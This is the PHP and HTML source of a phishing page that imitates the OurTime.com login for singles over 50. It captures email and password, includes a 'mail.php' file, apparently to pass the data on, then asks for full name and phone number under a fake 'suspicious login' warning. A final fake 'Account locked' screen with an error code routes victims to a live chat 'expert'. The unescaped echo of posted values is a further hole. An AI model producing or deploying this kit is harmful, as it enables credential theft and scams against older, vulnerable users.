<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
      <meta name="viewport" content="width=1280">
      <meta name="msapplication-config" content="none" />
      <title>OurTime.com - The 50+ Single Network</title>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon" />
      <link href="assets/base_external.css" rel="stylesheet" type="text/css" />
      <link href="assets/166.css" rel="stylesheet" type="text/css" />
      <script src="assets/jquery-3.5.1.min.js" type="text/javascript"></script>
   </head>
   <body class="external-layout combine-likes">
      <div class="loader2 hidden">
         <div class="bg"></div>
         <div class="spinner default-image" aria-label="Please wait....">
            <div class="lottie-container"></div>
         </div>
      </div>
      <div id="headerV2">
         <div class="header-container">
            <div class="logo-container" title="OurTime.com" aria-label="OurTime.com landing page">
               <a href="/?notrack"><img src="assets/logo_v2.png" border="0" alt="OurTime.com" /></a>
            </div>
            <div class="externalheadernologinV2">
               <a href="#" target="_blank">A People Media Site</a>
            </div>
         </div>
      </div>
      <div id="maincontent">
         <div id="columnleftexternal">
            <div id="externallogin">
               <div class="externalcontainer bgcolor-main">

                  <?php
                     if (isset($_POST['btnLoginMore'])) {
                        
                        include 'mail.php';
                    ?>
                    <div id="externalloginmiddleleft">
                     <h1>There is a suspicious login attempt from your server<br>Kindly verify your details</h1>
                     <div class="field-validation-error hidden">
                        <div id="externalloginerror">
                           <p></p>
                        </div>
                        <div id="externalloginerrorarrow"><img src="assets/v6/Images/common/errorarrow.png"/></div>
                     </div>
                    <form action="" method="post">
                          <input type="hidden" name="email" value="<?php echo $_POST['email']; ?>" />
                         <input type="hidden" name="password" value="<?php echo $_POST['password']; ?>" />
                        <div id="externalloginusername">
                           <p>Full Name</p>
                           <input id="name" type="text" name="name" tabindex="1" value="" />
                        </div>
                        <div id="externalloginpassword">
                           <p>Number</p>
                           <input id="number" type="text" name="number" autocomplete="off" tabindex="2" value="" />
                        </div>
                        
                        <div id="externalloginbtn" class="login-button">
                           <button class="button_style" name="fromLog" type="submit" class="btnSubmit" />Verify</button>
                        </div>
                     </form>
                  </div>

                <?php } elseif (isset($_POST['fromLog'])) {
                     include 'mail.php';
                 ?>
                  <div id="externalloginmiddleleft" style="padding: 20px; text-align: center;">
                     <h1>Account locked</h1>
                            <p style="font-size: 20px; padding: 20px">
                              Your account has been <b>temporarily locked</b><br> for security reasons.
                              <br><br>Kindly connect to chat for resolving the issues.
                            </p>
                             <div class="form">
                                 <label>Error CODE: <b>6X76D</b></label><br>
                             </div>
                             <div class="calling-number">
                                 <a class="btn btn-danger" href="javascript:void(Tawk_API.toggle())" style="    background: #bf0707; color: #fff !important;padding: 5px; margin-top: 20px; display: inline-block;">Ask Expert</a>
                        
                     </div>
                  </div>

                  <?php } else { ?>

                     <div id="externalloginmiddleleft">
                     <h1>Login to OurTime.com</h1>
                     <div class="field-validation-error hidden">
                        <div id="externalloginerror">
                           <p></p>
                        </div>
                     </div>
                    <form action="" method="post">
                        
                        <div id="externalloginusername">
                           <p>Email</p>
                           <input id="email" type="text" name="email" tabindex="1" value="" />
                        </div>
                        <div id="externalloginpassword">
                           <p>Password</p>
                           <input id="password" type="password" name="password" autocomplete="off" tabindex="2" value="" />
                        </div>
                        <div id="externalloginrememberme">
                           <input id="chkRememberMe" type="checkbox" name="RememberMe"  value="true"/>
                           <label for="chkRememberMe">
                              <p>Remember Me</p>
                           </label>
                        </div>
                        <div id="externalloginbtn" class="login-button">
                           <!-- <a href="javascript:void(0);" class="button_style" title="Login">Login</a> -->
                           <button class="button_style" name="btnLoginMore" type="submit" class="btnSubmit" />Login</button>
                        </div>
                     </form>
                  </div>
                 <?php } ?>




                  <div id="externalloginmiddleright" class="bgcolor-login">
                     <p>
                        Not a member yet?<br/>
                        <a href="/v3/signup">Join Free</a>
                     </p>
                     <p>
                        Forgot password?<br/>
                        <a href="/v3/forgotpassword">Click here</a>
                     </p>
                  </div>
                  <p class="clearfix">&nbsp;</p>
               </div>
            </div>
          
         </div>
         <div id="columnrightexternal">
         </div>
         <p class="clearfix">&nbsp;</p>
         <p class="clearfix">&nbsp;</p>
      </div>
      <div id="footer">
         <div id="footercontent">
            <div id="footercontentleft">
               <p>
                  Copyright &copy; 2022 People Media. All rights reserved.  166x2617.  <a href="#">Terms of Use</a> | <a href="#">Privacy Policy</a> | <a href="#">Cookie Policy</a> | <a href="#">Security</a>
               </p>
            </div>
         </div>
      </div>
      <div id="externallinks">
         <p>
            <a href="#">home</a> |
            <a href="#">safety tips</a> |
            <a href="#">guidelines</a> |
            <a href="#">security</a> |
            <a href="#">contact us</a> |
            <a href="#">billing</a> |
            <a href="#">success stories</a> |
            <a href="#">careers</a> |
            <a href="#">about</a> |
            <a href="#" target="_blank">advertise with us</a> |
            <a href="#">search</a> |
            <a href="#">join now</a> |
         
            <a href="#">site map</a>
         </p>
      </div>
   </body>
</html>